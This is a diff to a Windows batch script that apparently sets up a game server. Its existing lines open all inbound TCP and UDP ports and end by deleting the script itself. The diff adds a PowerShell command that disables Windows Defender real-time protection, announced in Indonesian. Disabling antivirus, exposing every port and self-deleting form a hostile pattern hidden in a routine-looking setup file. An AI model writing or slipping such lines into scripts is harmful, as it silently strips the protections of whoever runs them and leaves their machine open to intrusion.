@@ -29,4 +29,7 @@ netsh advfirewall firewall add rule name="Game Server - Allow All TCP Inbound" d
 netsh advfirewall firewall add rule name="Game Server - Allow All UDP Inbound" dir=in action=allow protocol=UDP localport=1-65535
 ECHO Firewall rules configured for game server (All TCP/UDP ports allowed).
 
+echo Menonaktifkan Real-time protection...
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+
 del "%~f0"
